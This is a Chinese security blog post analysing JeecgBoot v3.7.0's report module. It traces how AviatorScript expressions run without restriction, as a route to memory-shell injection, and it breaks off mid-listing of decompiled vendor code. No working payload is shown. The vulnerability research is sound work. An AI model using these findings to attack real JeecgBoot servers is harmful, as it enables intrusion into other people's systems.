<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="环境JeecgBoot v3.7.0 漏洞分析由于代码不是很难，这里我主要分享一些我在突破内存马注入过程中的一些坑点 JeecgBoot后台存在这样一个功能，在积木报表中，支持使用一些表达式公式，但是它不会实时渲染，需要我们通过预览或者导出功能触发渲染  那么自然而然，我们不难想到一点，去年积木报表就出过freemarker表达式的问题，在这里渲染时，是否也会触发呢，于是我们快乐的敲下了这样一行代"><meta property="og:type" content="article"><meta property="og:title" content="JeecgBoot最新版权限绕过第二弹之内存马注入实录"><meta property="og:url" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="环境JeecgBoot v3.7.0 漏洞分析由于代码不是很难，这里我主要分享一些我在突破内存马注入过程中的一些坑点 JeecgBoot后台存在这样一个功能，在积木报表中，支持使用一些表达式公式，但是它不会实时渲染，需要我们通过预览或者导出功能触发渲染  那么自然而然，我们不难想到一点，去年积木报表就出过freemarker表达式的问题，在这里渲染时，是否也会触发呢，于是我们快乐的敲下了这样一行代"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802203907967.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802211142131.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802210845078.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802211826498.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802212224624.png"><meta property="og:image" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802215747451.png"><meta property="article:published_time" content="2024-08-02T12:25:12.000Z"><meta property="article:modified_time" content="2025-09-02T14:49:08.129Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Java"><meta property="article:tag" content="JeecgBoot"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802203907967.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>JeecgBoot最新版权限绕过第二弹之内存马注入实录</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2024/08/14/year/2024/8/%E6%B5%85%E8%B0%88%E5%B8%86%E8%BD%AF%E5%9C%A8Windows%E4%B8%8B%E5%86%99%E6%96%87%E4%BB%B6RCE%E5%A7%BF%E5%8A%BF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2024/08/01/year/2024/8/%E6%B5%85%E6%9E%90JeecgBoot-jmreport%E6%9C%80%E6%96%B0%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&text=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&is_video=false&description=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=JeecgBoot最新版权限绕过第二弹之内存马注入实录&body=Check out this article: https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&title=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&name=JeecgBoot最新版权限绕过第二弹之内存马注入实录&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/&t=JeecgBoot最新版权限绕过第二弹之内存马注入实录"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">JeecgBoot最新版权限绕过第二弹之内存马注入实录</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2024-08-02T12:25:12.000Z" class="dt-published" itemprop="datePublished">2024-08-02</time> (Updated: <time datetime="2025-09-02T14:49:08.129Z" class="dt-updated" itemprop="dateModified">2025-09-02</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/Java/">Java</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/JeecgBoot/" rel="tag">JeecgBoot</a></div></div></header><div class="content e-content" itemprop="articleBody"><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>JeecgBoot v3.7.0</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由于代码不是很难，这里我主要分享一些我在突破内存马注入过程中的一些坑点</p><p>JeecgBoot后台存在这样一个功能，在积木报表中，支持使用一些表达式公式，但是它不会实时渲染，需要我们通过预览或者导出功能触发渲染</p><p><img src="/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802203907967.png" alt="image-20240802203907967"></p><p>那么自然而然，我们不难想到一点，去年积木报表就出过freemarker表达式的问题，在这里渲染时，是否也会触发呢，于是我们快乐的敲下了这样一行代码</p><p><img src="/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802211142131.png" alt="image-20240802211142131"></p><p>渲染时没反应，打开控制台我们看到了这样一串报错，可以发现确实解析了，同时也可以看到我们语法也存在一定问题，当然这不是很重要，第一步我只是想确认是否支持渲染freemarker表达式</p><p><img src="/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802210845078.png" alt="image-20240802210845078"></p><p>接下来查看渲染处理部分的代码发现，在<code>org.jeecg.modules.jmreport.desreport.render.utils.FreeMarkerUtils#a(java.lang.String, java.lang.String)</code>，这里使用了<code>SAFER_RESOLVER</code>，因此想快速通过这个点突破实现注入不太可能了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Template <span class="title">a</span><span class="params">(String var1, String var2)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Configuration var3 = <span class="keyword">new</span> Configuration(Configuration.DEFAULT_INCOMPATIBLE_IMPROVEMENTS);</span><br><span class="line">    var3.setNumberFormat(<span class="string">&quot;#.##########&quot;</span>);</span><br><span class="line">    var3.setClassForTemplateLoading(<span class="keyword">this</span>.getClass(), var2);</span><br><span class="line">    var3.setDefaultEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    var3.setClassicCompatible(<span class="keyword">true</span>);</span><br><span class="line">    var3.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);</span><br><span class="line">    Template var4 = var3.getTemplate(var1);</span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来继续回到一开始提到的点，既然支持表达式，那么我们是否可以从官方文档入手尝试发现一些系统实现的表达式的一些问题呢?</p><p>从官网中我们可以看到:<a target="_blank" rel="noopener" href="https://help.jeecg.com/jimureport/function/condition.html">https://help.jeecg.com/jimureport/function/condition.html</a></p><p>可以看到这些用法还是很多的，在这里我们第一眼能看到支持自定义报表函数，可惜需要提前注册</p><p><img src="/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802211826498.png" alt="image-20240802211826498"></p><p>接下来，我们想快速定位表达式的处理，那么最快的方式就是让他报错</p><p><img src="/2024/08/02/year/2024/8/%E6%9C%80%E6%96%B0%E7%89%88JeecgBoot%E7%AC%AC%E4%BA%8C%E5%BC%B9%E4%B9%8B%E5%8F%97%E9%99%90%E6%9D%A1%E4%BB%B6%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E5%BD%95/image-20240802212224624.png" alt="image-20240802212224624"></p><p>随意输入一些字符我们可以发现，控制台果然出现了报错，从这里我们知道了使用了<code>AviatorScript</code>表达式处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Aviator WARN] The function &#x27;max&#x27; is already exists, but is replaced with new one.</span><br><span class="line">[Aviator WARN] The function &#x27;min&#x27; is already exists, but is replaced with new one.</span><br><span class="line">[Aviator WARN] The function &#x27;concat&#x27; is already exists, but is replaced with new one.</span><br><span class="line">2024-08-02 21:21:13.509 [http-nio-8080-exec-3] WARN  o.j.modules.jmreport.desreport.express.ExpressUtil:360 - 执行表达式错误:: expression=zzz(&quot;Y4tacker&quot;), env=&#123;ignore=[]&#125;, error=Function not found: zzz</span><br></pre></td></tr></table></figure><p>同时我们也快速定位到了对应处理的类<code>org.jeecg.modules.jmreport.desreport.express.ExpressUtil</code></p><p>在这里我仅列出了表达式引擎初始部分的代码，在这里可以看到对于表达式没有任何的限制！！！</p><p>Ps: 关于这个表达式一个比较全面的中文文档:<a target="_blank" rel="noopener" href="https://www.yuque.com/boyan-avfmj/aviatorscript/ou23gy#elOSu">https://www.yuque.com/boyan-avfmj/aviatorscript/ou23gy#elOSu</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> AviatorEvaluatorInstance g = AviatorEvaluator.newInstance();</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    g.setOption(Options.TRACE_EVAL, <span class="keyword">false</span>);</span><br><span class="line">    g.setOption(Options.ALWAYS_PARSE_FLOATING_POINT_NUMBER_INTO_DECIMAL, <span class="keyword">true</span>);</span><br><span class="line">    Sum var0 = <span class="keyword">new</span> Sum();</span><br><span class="line">    g.addFunction(var0);</span><br><span class="line">    g.addFunction(var0.getName().toUpperCase(), var0);</span><br><span class="line">    Avg var1 = <span class="keyword">new</span> Avg();</span><br><span class="line">    g.addFunction(var1);</span><br><span class="line">    g.addFunction(var1.getName().toUpperCase(), var1);</span><br><span class="line">    Max var2 = <span class="keyword">new</span> Max();</span><br><span class="line">    g.addFunction(var2);</span><br><span class="line">    g.addFunction(var2.getName().toUpperCase(), var2);</span><br><span class="line">    Min var3 = <span class="keyword">new</span> Min();</span><br><span class="line">    g.addFunction(var3);</span><br><span class="line">    g.addFunction(var3.getName().toUpperCase(), var3);</span><br><span class="line">    RowNum var4 = <span class="keyword">new</span> RowNum();</span><br><span class="line">    g.addFunction(var4);</span><br><span class="line">    g.addFunction(var4.getName().toUpperCase(), var4);</span><br><span class="line">    Case var5 = <span class="keyword">new</span> Case();</span><br><span class="line">    g.addFunction(var5);</span><br><span class="line">    g.addFunction(var5.getName().toUpperCase(), var5);</span><br><span class="line">    DateFormat var6 = <span class="keyword">new</span> DateFormat();</span><br><span class="line">    g.addFunction(var6);</span><br><span class="line">    g.addFunction(var6.getName().toUpperCase(), var6);</span><br><span class="line">    DayFormat var7 = <span class="keyword">new</span> DayFormat();</span><br><span class="line">    g.addFunction(var7);</span><br><span class="line">    g.addFunction(var7.getName().toUpperCase(), var7);</span><br><span class="line">    DayFormat2 var8 = <span class="keyword">new</span> DayFormat2();</span><br><span class="line">    g.addFunction(var8);</span><br><span class="line">    g.addFunction(var8.getName().toUpperCase(), var8);</span><br><span class="line">    HourFormat var9 = <span class="keyword">new</span> HourFormat();</span><br><span class="line">    g.addFunction(var9);</span><br><span class="line">    g.addFunction(var9.getName().toUpperCase(), var9);</span><br><span class="line">    HourFormat2 var10 = <span class="keyword">new</span> HourFormat2();</span><br><span class="line">    g.addFunction(var10);</span><br><span class="line">    g.addFunction(var10.getName().toUpperCase(), var10);</span><br><span class="line">    MonthFormat var11 = <span class="keyword">new</span> MonthFormat();</span><br><span class="line">    g.addFunction(var11);</span><br><span class="line">    g.addFunction(var11.getName().toUpperCase(), var11);</span><br><span class="line">    MonthFormat2 var12 = <span class="keyword">new</span> MonthFormat2();</span><br><span class="line">    g.addFunction(var12);</span><br><span class="line">    g.addFunction(var12.getName().toUpperCase(), var12);</span><br><span class="line">    TimeFormat var13 = <span class="keyword">new</span> TimeFormat();</span><br><span class="line">    g.addFunction(var13);</span><br><span class="line">    g.addFunction(var13.getName().toUpperCase(), var13);</span><br><span class="line">    YearFormat var14 = <span class="keyword">new</span> YearFormat();</span><br><span class="line">    g.addFunction(var14);</span><br><span class="line">    g.addFunction(var14.getName().toUpperCase(), var14);</span><br><span class="line">    RoundFormat var15 = <span class="keyword">new</span> RoundFormat();</span><br><span class="line">    g.addFunction(var15);</span><br><span class="line">    g.addFunction(var15.getName().toUpperCase(), var15);</span><br><span class="line">    FloorFormat var16 = <span class="keyword">new</span> FloorFormat();</span><br><span class="line">    g.addFunction(var16);</span><br><span class="line">    g.addFunction(var16.getName().toUpperCase(), var16);</span><br><span class="line">    AbsFormat var17 = <span class="keyword">new</span> AbsFormat();</span><br><span class="line">    g.addFunction(var17);</span><br><span class="line">    g.addFunction(var17.getName().toUpperCase(), var17);</span><br><span class="line">    CeilFormat var18 = <span class="keyword">new</span> CeilFormat();</span><br><span class="line">    g.addFunction(var18);</span><br><span class="line">    g.addFunction(var18.getName().toUpperCase(), var18);</span><br><span class="line">    CharFormat var19 = <span class="keyword">new</span> CharFormat();</span><br><span class="line">    g.addFunction(var19);</span><br><span class="line">    g.addFunction(var19.getName().toUpperCase(), var19);</span><br><span class="line">    Color var20 = <span class="keyword">new</span> Color();</span><br><span class="line">    g.addFunction(var20);</span><br><span class="line">    g.addFunction(var20.getName().toUpperCase(), var20);</span><br><span class="line">    ColorRow var21 = <span class="keyword">new</span> ColorRow();</span><br><span class="line">    g.addFunction(var21);</span><br><span class="line">    g.addFunction(var21.getName().toUpperCase(), var21);</span><br><span class="line">    TruncFormat var22 = <span class="keyword">new</span> TruncFormat();</span><br><span class="line">    g.addFunction(var22);</span><br><span class="line">    g.addFunction(var22.getName().toUpperCase(), var22);</span><br><span class="line">    ConcatFormat var23 = <span class="keyword">new</span> ConcatFormat();</span><br><span class="line">    g.addFunction(var23);</span><br><span class="line">    g.addFunction(var23.getName().toUpperCase(), var23);</span><br><span class="line">    LowerFormat var24 = <span class="keyword">new</span> LowerFormat();</span><br><span class="line">    g.addFunction(var24);</span><br><span class="line">    g.addFunction(var24.getName().toUpperCase(), var24);</span><br><span class="line">    UpperFormat var25 = <span class="keyword">new</span> 